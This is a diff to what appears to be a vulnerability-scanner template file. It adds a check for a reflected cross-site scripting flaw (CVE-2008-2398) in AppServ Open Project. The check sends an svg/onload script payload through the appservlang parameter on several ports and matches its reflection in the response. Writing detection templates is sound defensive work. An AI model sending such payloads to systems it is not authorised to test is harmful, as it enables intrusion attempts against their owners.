@@ -34,6 +34,47 @@
       ]
     },
     {
+      "id": "cve-2008-2398",
+      "info": {
+        "author": "unstabl3",
+        "name": "AppServ Open Project 2.5.10 and earlier XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<svg/onload=alert(1)>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?appservlang=en%22><svg/onload=alert(1)>",
+            "{{BaseURL}}:8181/index.php?appservlang=en%22><svg/onload=alert(1)>",
+            "{{BaseURL}}:8081/index.php?appservlang=en%22><svg/onload=alert(1)>"
+          ]
+        }
+      ]
+    },
+    {
       "id": "cve-2013-2251",
       "info": {
         "author": "exploitation & @dwisiswant0",
